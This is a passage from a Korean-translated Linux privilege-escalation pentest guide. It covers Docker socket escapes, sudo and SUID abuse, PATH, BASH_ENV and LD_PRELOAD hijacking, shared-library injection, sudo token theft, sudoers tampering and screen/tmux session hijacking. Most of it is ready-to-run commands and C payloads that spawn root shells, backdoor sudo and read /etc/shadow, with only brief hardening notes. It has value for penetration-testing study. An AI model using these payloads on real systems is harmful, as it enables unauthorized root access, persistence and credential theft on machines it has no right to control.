만약 Docker 소켓에 대한 쓰기 권한이 있다면, 다음 명령어를 사용해 escalate privileges할 수 있습니다:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
These commands allow you to run a container with root-level access to the host's file system.

#### **Docker API 직접 사용하기**

Docker CLI를 사용할 수 없는 경우에도 Docker 소켓은 Docker API와 `curl` 명령으로 조작할 수 있습니다.

1.  **List Docker Images:** 사용 가능한 이미지 목록을 가져옵니다.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** 호스트 시스템의 루트 디렉토리를 마운트하는 컨테이너를 생성하는 요청을 보냅니다.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

새로 생성된 컨테이너를 시작합니다:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** `socat`을 사용해 컨테이너에 연결을 설정하여 그 안에서 명령을 실행할 수 있습니다.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

`socat` 연결을 설정한 후에는 컨테이너 안에서 호스트 파일시스템에 대한 루트 권한으로 직접 명령을 실행할 수 있습니다.

### Others

참고: docker 소켓에 대해 쓰기 권한이 있다면(즉, **inside the group `docker`**) [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group). 또한 [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

다음에서 **more ways to break out from docker or abuse it to escalate privileges**를 확인하세요:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

`ctr` 명령을 사용할 수 있다면 다음 페이지를 읽어보세요 — **you may be able to abuse it to escalate privileges**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

`runc` 명령을 사용할 수 있다면 다음 페이지를 읽어보세요 — **you may be able to abuse it to escalate privileges**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus는 애플리케이션들이 효율적으로 상호작용하고 데이터를 공유할 수 있게 해주는 정교한 inter-Process Communication (IPC) 시스템입니다. 현대의 Linux 시스템을 염두에 두고 설계되어 다양한 형태의 애플리케이션 통신을 위한 강력한 프레임워크를 제공합니다.

이 시스템은 프로세스 간 데이터 교환을 향상시키는 기본적인 IPC를 지원하며, 이는 향상된 UNIX domain sockets를 떠올리게 합니다. 또한 이벤트나 신호를 브로드캐스트하여 시스템 구성 요소 간의 원활한 통합을 촉진합니다. 예를 들어, 수신 전화를 알리는 Bluetooth 데몬의 신호가 음악 플레이어를 음소거하도록 트리거할 수 있어 사용자 경험을 향상시킵니다. 추가로, D-Bus는 원격 객체 시스템을 지원하여 애플리케이션 간 서비스 요청 및 메서드 호출을 단순화함으로써 전통적으로 복잡했던 과정을 간소화합니다.

D-Bus는 allow/deny 모델로 동작하며, 일치하는 정책 규칙들의 누적 효과에 따라 메시지 권한(메서드 호출, 신호 전송 등)을 관리합니다. 이러한 정책들은 버스와의 상호작용을 지정하며, 해당 권한을 악용하면 privilege escalation이 가능해질 수 있습니다.

예를 들어 `/etc/dbus-1/system.d/wpa_supplicant.conf`에 있는 이러한 정책은 루트 사용자가 `fi.w1.wpa_supplicant1`을 소유하고 해당 서비스로 메시지를 보내고 받을 수 있는 권한을 상세히 기술합니다.

특정 사용자나 그룹이 지정되지 않은 정책은 모든 사용자에게 적용되며, "default" 컨텍스트 정책은 다른 특정 정책으로 다루어지지 않는 모든 대상에 적용됩니다.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**여기에서 D-Bus 통신을 enumerate하고 exploit하는 방법을 배우세요:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **네트워크**

네트워크를 enumerate하고 머신의 위치를 파악하는 것은 항상 흥미롭습니다.

### 일반적인 enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### 열린 포트

접근하기 전에 상호작용할 수 없었던 머신에서 실행 중인 네트워크 서비스를 항상 확인하세요:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

sniff traffic을 할 수 있는지 확인하세요. 가능하다면 일부 credentials를 획득할 수 있습니다.
```
timeout 1 tcpdump
```
## 사용자

### 일반 열거

자신이 **who**인지, 어떤 **privileges**를 가지고 있는지, 시스템에 어떤 **users**가 있는지, 누가 **login**할 수 있는지, 누가 **root privileges**를 가지고 있는지 확인하세요:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

일부 Linux 버전은 **UID > INT_MAX**인 사용자가 권한을 상승시킬 수 있는 버그의 영향을 받았습니다. 자세한 정보: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) 및 [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploit it** using: **`systemd-run -t /bin/bash`**

### Groups

root 권한을 부여할 수 있는 그룹의 **멤버인지** 확인하세요:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Clipboard

클립보드에 흥미로운 내용이 있는지 확인하세요 (가능하면)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### 비밀번호 정책
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Known passwords

환경의 **비밀번호를 알고 있다면**, 그 비밀번호를 사용해 **각 사용자로 로그인해 보세요**.

### Su Brute

많은 소음을 발생시키는 것을 개의치 않고, 컴퓨터에 `su`와 `timeout` 바이너리가 있는 경우, [su-bruteforce](https://github.com/carlospolop/su-bruteforce)를 사용해 사용자를 brute-force해 볼 수 있습니다.\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)가 `-a` 매개변수로 사용자들을 brute-force하도록 시도하기도 합니다.

## Writable PATH abuses

### $PATH

만약 당신이 **$PATH의 특정 폴더 안에 쓸 수 있다면**, 쓰기 가능한 폴더 안에 다른 사용자가(이상적으로는 root가) 실행할 명령어 이름으로 **backdoor를 생성**하여 권한을 상승시킬 수 있습니다. 단, 해당 명령어가 $PATH에서 당신의 쓰기 가능한 폴더보다 앞에 위치한 폴더에서 불러와지지 않아야 합니다.

### SUDO and SUID

sudo로 어떤 명령을 실행할 수 있도록 허용되어 있거나, 파일에 suid 비트가 설정되어 있을 수 있습니다. 다음을 사용해 확인하세요:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
일부 **예상치 못한 명령은 파일을 읽고/또는 쓸 수 있거나 심지어 명령을 실행할 수 있습니다.** 예를 들어:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo 구성은 사용자가 비밀번호를 알지 못해도 다른 사용자의 권한으로 특정 명령을 실행할 수 있도록 허용할 수 있다.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
이 예제에서 사용자 `demo`는 `root`로 `vim`을 실행할 수 있으므로, root 디렉터리에 ssh key를 추가하거나 `sh`를 호출해 셸을 얻는 것은 이제 매우 쉽습니다.
```
sudo vim -c '!sh'
```
### SETENV

이 지시문은 사용자가 무언가를 실행하는 동안 **set an environment variable** 할 수 있게 합니다:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
이 예제는 **HTB machine Admirer 기반**으로, 스크립트를 root로 실행할 때 임의의 python 라이브러리를 로드할 수 있는 **PYTHONPATH hijacking**에 **취약했습니다**:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV가 sudo env_keep로 유지될 때 → root shell

If sudoers preserves `BASH_ENV` (e.g., `Defaults env_keep+="ENV BASH_ENV"`), you can leverage Bash’s non-interactive startup behavior to run arbitrary code as root when invoking an allowed command.

- 작동 원리: 비대화형 셸의 경우, Bash는 `$BASH_ENV`를 평가하고 대상 스크립트를 실행하기 전에 해당 파일을 소싱합니다. 많은 sudo 규칙은 스크립트나 셸 래퍼의 실행을 허용합니다. `BASH_ENV`가 sudo에 의해 보존되면, 해당 파일은 root 권한으로 소싱됩니다.

- 요구 사항:
- 실행 가능한 sudo 규칙 (비대화형으로 `/bin/bash`를 호출하는 대상이나, 또는 어떤 bash 스크립트라도).
- `env_keep`에 `BASH_ENV`가 포함되어 있어야 함 (`sudo -l`로 확인).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Hardening:
- `env_keep`에서 `BASH_ENV` (및 `ENV`) 제거, `env_reset` 권장.
- sudo-allowed commands에 대한 shell wrappers 사용을 피하고, 최소한의 바이너리 사용.
- 보존된 env vars가 사용될 때 sudo I/O 로깅 및 경고 고려.

### Sudo env_keep+=PATH / insecure secure_path → PATH hijack

If `sudo -l` shows `env_keep+=PATH` or a `secure_path` containing attacker-writable entries (e.g., `/home/<user>/bin`), any relative command inside the sudo-allowed target can be shadowed.

- 요구사항: 절대 경로 없이 명령을 호출하는 스크립트/바이너리를 실행하는 sudo 규칙(종종 `NOPASSWD`)과, 먼저 검색되는 쓰기 가능한 PATH 항목.
```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```
### Sudo 실행 우회 경로
**우회**하여 다른 파일을 읽거나 **symlinks**를 사용하세요. 예를 들어 sudoers 파일에서: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
만약 **wildcard**가 사용된다면 (\*), 훨씬 쉬워집니다:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**대응책**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary — 명령 경로가 없는 경우

만약 **sudo permission**이 단일 명령에 대해 **경로를 지정하지 않은 채로** 주어진다면: _hacker10 ALL= (root) less_ PATH variable을 변경하여 이를 악용할 수 있습니다.
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
이 기법은 **suid** 바이너리가 **executes another command without specifying the path to it (always check with** _**strings**_ **the content of a weird SUID binary)**)인 경우에도 사용할 수 있습니다.

[Payload examples to execute.](payloads-to-execute.md)

### SUID 바이너리: 명령 경로가 있는 경우

만약 **suid** 바이너리가 **executes another command specifying the path** 경우라면, suid 파일이 호출하는 명령 이름으로 **export a function**을 시도해볼 수 있습니다.

예를 들어, suid 바이너리가 _**/usr/sbin/service apache2 start**_ 를 호출한다면, 해당 명령 이름으로 함수를 생성하고 export해야 합니다:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
그런 다음, suid 바이너리를 호출하면 이 함수가 실행됩니다

### LD_PRELOAD & **LD_LIBRARY_PATH**

The **LD_PRELOAD** environment variable is used to specify one or more shared libraries (.so files) to be loaded by the loader before all others, including the standard C library (`libc.so`). This process is known as preloading a library.

However, to maintain system security and prevent this feature from being exploited, particularly with **suid/sgid** executables, the system enforces certain conditions:

- The loader disregards **LD_PRELOAD** for executables where the real user ID (_ruid_) does not match the effective user ID (_euid_).
- For executables with suid/sgid, only libraries in standard paths that are also suid/sgid are preloaded.

Privilege escalation can occur if you have the ability to execute commands with `sudo` and the output of `sudo -l` includes the statement **env_keep+=LD_PRELOAD**. This configuration allows the **LD_PRELOAD** environment variable to persist and be recognized even when commands are run with `sudo`, potentially leading to the execution of arbitrary code with elevated privileges.
```
Defaults        env_keep += LD_PRELOAD
```
다음으로 저장: **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
그런 다음 아래를 사용하여 **컴파일하세요**:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
마지막으로, **escalate privileges**를 실행합니다
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> 유사한 privesc는 공격자가 **LD_LIBRARY_PATH** env variable을 제어할 수 있다면 악용될 수 있습니다. 이는 공격자가 라이브러리가 검색될 경로를 제어하기 때문입니다.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

비정상적으로 보이는 **SUID** 권한을 가진 binary를 발견하면, 해당 binary가 **.so** 파일을 제대로 로드하는지 확인하는 것이 좋습니다. 다음 명령어를 실행하여 확인할 수 있습니다:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
예를 들어, _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ 같은 오류가 발생하면 잠재적 악용 가능성을 시사합니다.

이를 악용하려면 _"/path/to/.config/libcalc.c"_ 라는 C 파일을 생성하고 다음 코드를 포함시킵니다:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
이 코드는 컴파일되어 실행되면 파일 권한을 조작하고 권한이 상승된 셸을 실행하여 권한을 상승시키는 것을 목표로 합니다.

위의 C 파일을 다음 명령으로 shared object (.so) 파일로 컴파일하세요:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
마지막으로, 영향을 받은 SUID binary를 실행하면 exploit이 트리거되어 잠재적으로 시스템 권한 탈취가 발생할 수 있습니다.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
쓰기 가능한 폴더에서 라이브러리를 로드하는 SUID binary를 찾았으니, 그 폴더에 필요한 이름으로 라이브러리를 생성합시다:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
다음과 같은 오류가 발생하면
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
즉, 생성한 라이브러리에는 `a_function_name`이라는 함수가 있어야 합니다.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) 은 공격자가 로컬 보안 제한을 우회하는 데 악용할 수 있는 Unix 바이너리의 선별된 목록입니다. [**GTFOArgs**](https://gtfoargs.github.io/) 는 명령에 **인수만 주입할 수 있는** 경우에 대해 동일합니다.

프로젝트는 Unix 바이너리의 정상적인 기능들을 수집하여 제한된 셸을 탈출하거나, 권한을 상승 또는 유지하고, 파일을 전송하며, bind 및 reverse shell을 생성하고, 기타 post-exploitation 작업을 용이하게 할 수 있도록 정리합니다.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

만약 `sudo -l`에 접근할 수 있다면 도구 [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) 를 사용해 어떤 sudo 규칙을 악용할 수 있는지 확인할 수 있습니다.

### Reusing Sudo Tokens

비밀번호는 모르는 상태에서 **sudo access**는 있는 경우, **sudo 명령 실행을 기다렸다가 세션 token을 탈취**함으로써 권한을 상승시킬 수 있습니다.

권한 상승을 위한 요구사항:

- 이미 사용자 "_sampleuser_"로 쉘을 가지고 있어야 합니다
- "_sampleuser_"는 **지난 15mins 내에 `sudo`**를 사용해 무언가를 실행한 적이 있어야 합니다 (기본적으로 이는 sudo token의 지속시간으로, 이 기간 동안 비밀번호 없이 `sudo`를 사용할 수 있습니다)
- `cat /proc/sys/kernel/yama/ptrace_scope`가 0이어야 합니다
- `gdb`에 접근 가능해야 합니다 (업로드할 수 있어야 합니다)

(임시로 `ptrace_scope`를 활성화하려면 `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope`를 사용하거나, 영구적으로 설정하려면 `/etc/sysctl.d/10-ptrace.conf`를 수정해 `kernel.yama.ptrace_scope = 0`로 설정하세요)

이 모든 요구사항이 충족되면, **다음을 사용해 권한을 상승시킬 수 있습니다:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- The **first exploit** (`exploit.sh`) will create the binary `activate_sudo_token` in _/tmp_. You can use it to **activate the sudo token in your session** (you won't get automatically a root shell, do `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- **두 번째 exploit** (`exploit_v2.sh`)는 _/tmp_에 sh shell을 **root가 소유하고 setuid가 설정된** 상태로 생성합니다.
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- 세 번째 **exploit** (`exploit_v3.sh`)는 **sudoers file**을 생성하여 **sudo tokens를 영구화하고 모든 사용자가 sudo를 사용하도록 허용**합니다
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

해당 폴더 또는 폴더 내에 생성된 파일들에 대해 **쓰기 권한**이 있다면, 바이너리 [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools)을 사용해 **사용자와 PID에 대한 sudo 토큰을 생성**할 수 있습니다.\
예를 들어, 파일 _/var/run/sudo/ts/sampleuser_을 덮어쓸 수 있고 그 사용자로서 PID 1234인 셸이 있다면, 다음과 같이 비밀번호를 알 필요 없이 **sudo 권한을 획득**할 수 있습니다:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

파일 `/etc/sudoers` 및 `/etc/sudoers.d` 안의 파일들은 누가 `sudo`를 사용할 수 있는지와 그 방법을 구성합니다. 이 파일들은 **기본적으로 사용자 root와 그룹 root만 읽을 수 있습니다**. **만약** 이 파일을 **읽을** 수 있다면 **흥미로운 정보를 얻을 수** 있고, 어떤 파일을 **쓸** 수 있다면 **escalate privileges**할 수 있습니다.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
write 권한이 있으면 이 permission을 악용할 수 있습니다.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
이 권한을 악용하는 또 다른 방법:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

`sudo` 바이너리에 대한 몇 가지 대안이 있으며, 예를 들어 OpenBSD용 `doas`가 있습니다. 구성은 `/etc/doas.conf`에서 확인하세요.
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

사용자가 보통 머신에 접속해 권한 상승을 위해 `sudo`를 사용하는 것을 알고 있고 해당 사용자 컨텍스트에서 쉘을 얻었다면, 루트로서 당신의 코드를 실행한 뒤 사용자의 명령을 실행하는 새로운 sudo 실행 파일을 만들 수 있습니다. 그런 다음 사용자 컨텍스트의 **$PATH**를 수정(예: .bash_profile에 새 경로를 추가)하여 사용자가 `sudo`를 실행할 때 당신의 sudo 실행 파일이 실행되도록 합니다.

Note that if the user uses a different shell (not bash) you will need to modify other files to add the new path. For example[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) modifies `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. You can find another example in [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

또는 다음과 같이 실행:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Shared Library

### ld.so

The file `/etc/ld.so.conf` indicates **로드되는 설정 파일들이 어디에서 오는지**. Typically, this file contains the following path: `include /etc/ld.so.conf.d/*.conf`

That means that the configuration files from `/etc/ld.so.conf.d/*.conf` will be read. This configuration files **다른 폴더를 가리킵니다** — 그곳에서 **라이브러리**들이 **검색**됩니다. For example, the content of `/etc/ld.so.conf.d/libc.conf` is `/usr/local/lib`. **이 말은 시스템이 `/usr/local/lib` 안에서 라이브러리를 검색한다는 뜻입니다**.

If for some reason **a user has write permissions** on any of the paths indicated: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, any file inside `/etc/ld.so.conf.d/` or any folder within the config file inside `/etc/ld.so.conf.d/*.conf` he may be able to escalate privileges.\
다음 페이지에서 **이 잘못된 구성을 어떻게 악용하는지**를 확인하세요:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
lib을 `/var/tmp/flag15/`에 복사하면 `RPATH` 변수에 지정된 대로 프로그램이 이 위치에서 이를 사용합니다.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
그런 다음 `/var/tmp`에 악성 라이브러리를 `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`로 생성하십시오.
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## 권한

Linux capabilities는 프로세스에 사용 가능한 root 권한의 **부분 집합을 제공합니다**. 이는 실제로 root의 **privileges를 더 작고 구별되는 단위들로 분해**합니다. 이러한 각 단위는 독립적으로 프로세스에 부여될 수 있습니다. 이렇게 전체 권한 집합이 줄어들어 악용 위험이 감소합니다.\
다음 페이지를 읽어 **capabilities와 그것들을 악용하는 방법에 대해 더 알아보세요**:

{{#ref}}
linux-capabilities.md
{{#endref}}

## 디렉터리 권한

디렉터리에서, **bit for "execute"** 는 해당 사용자가 폴더로 **"cd"** 할 수 있음을 의미합니다.\
**"read"** 비트는 사용자가 **list** the **files** 할 수 있음을 의미하고, **"write"** 비트는 사용자가 새로운 **files** 를 **delete** 및 **create** 할 수 있음을 의미합니다.

## ACLs

Access Control Lists (ACLs)는 임의 권한의 2차 레이어를 나타내며, **overriding the traditional ugo/rwx permissions** 할 수 있습니다. 이러한 권한은 소유자나 그룹의 구성원이 아닌 특정 사용자에게 권한을 허용하거나 거부함으로써 파일 또는 디렉터리 접근 제어를 강화합니다. 이러한 수준의 **granularity ensures more precise access management**. 자세한 내용은 [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux)에서 확인하세요.

**부여** 사용자 "kali"에게 파일에 대한 read 및 write 권한:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**가져오기** 시스템에서 특정 ACLs를 가진 파일들:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## 열린 shell 세션

**구버전**에서는 다른 사용자(**root**)의 **shell** 세션을 **hijack**할 수 있습니다.\
**최신 버전**에서는 **자신의 사용자 계정**에 해당하는 screen 세션에만 **connect**할 수 있습니다. 그러나 **세션 내부의 흥미로운 정보**를 발견할 수 있습니다.

### screen sessions hijacking

**screen sessions 목록 보기**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**세션에 연결**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

이 문제는 **구형 tmux 버전**에서 발생했습니다. 비특권 사용자로서 root가 생성한 tmux (v2.1) 세션을 hijack할 수 없었습니다.

**tmux 세션 나열**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**세션에 연결하기**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB** for an example.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

2006년 9월부터 2008년 5월 13일 사이에 Debian 기반 시스템(Ubuntu, Kubuntu 등)에서 생성된 모든 SSL 및 SSH 키는 이 버그의 영향을 받을 수 있습니다.\
이 버그는 해당 OS에서 새로운 ssh 키를 생성할 때 발생하며, **가능한 변형은 단지 32,768개뿐이었다**. 이는 모든 경우의 수를 계산할 수 있음을 의미하며, **ssh public key를 가지고 대응하는 private key를 검색할 수 있다**. 계산된 경우의 수는 다음에서 확인할 수 있습니다: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH 흥미로운 구성 값

- **PasswordAuthentication:** password authentication이 허용되는지 여부를 지정합니다. 기본값은 `no`입니다.
- **PubkeyAuthentication:** public key authentication이 허용되는지 여부를 지정합니다. 기본값은 `yes`입니다.
- **PermitEmptyPasswords**: password authentication이 허용될 때, 서버가 빈 password 문자열을 가진 계정의 로그인을 허용하는지 여부를 지정합니다. 기본값은 `no`입니다.

### PermitRootLogin

root가 ssh를 사용해 로그인할 수 있는지 여부를 지정합니다. 기본값은 `no`입니다. 가능한 값:

- `yes`: root는 password와 private key로 로그인할 수 있습니다.
- `without-password` or `prohibit-password`: root는 private key로만 로그인할 수 있습니다.
- `forced-commands-only`: root는 private key로만 로그인하며, 명령어 옵션이 지정된 경우에만 가능합니다.
- `no` : 허용하지 않음

### AuthorizedKeysFile

